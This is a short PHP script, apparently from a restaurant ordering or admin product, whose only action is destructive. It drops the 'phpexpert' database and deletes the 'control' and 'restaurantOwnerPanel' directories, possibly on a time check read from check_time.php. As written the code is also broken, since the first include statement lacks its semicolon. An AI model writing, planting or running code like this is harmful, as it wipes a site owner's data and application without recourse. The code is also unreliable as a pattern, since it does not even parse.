<?php
include('config1.php')
$sql = 'DROP DATABASE phpexpert';
$retval = mysql_query($sql);
include('check_time.php');
delete_directory('control');
delete_directory('restaurantOwnerPanel');
?>